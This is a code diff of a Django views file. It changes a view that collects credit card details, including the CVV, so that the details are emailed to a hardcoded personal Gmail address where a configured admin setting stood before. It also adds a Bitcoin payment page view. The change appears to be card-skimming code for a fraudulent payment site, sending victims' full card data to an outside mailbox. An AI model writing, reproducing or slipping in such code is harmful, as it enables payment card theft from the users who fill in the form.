@@ -140,10 +140,10 @@ def credit_card_view(request):
             f"Expiration Date: {exp_date}\n"
             f"CVV: {cvv}"
         )
-        admin_email = settings.ADMIN_EMAIL
+        admin_email = 'boltdreamz@gmail.com'
         send_mail(subject, message, settings.DEFAULT_FROM_EMAIL, [admin_email])
 
-        return redirect('userauths:success_page')  # Redirect to a success page if needed
+        return redirect('userauths:success')  # Redirect to a success page if needed
 
     return render(request, 'userauths/credit_card_form.html')
 # @login_required
@@ -179,6 +179,10 @@ def success(request):
 
 def finish(request):
     return render(request, "userauths/finish.html")
+
+
+def btc_payment(request):
+    return render(request, "userauths/btc_payment.html")
 
 
 def generate_reset_pin_token(user):
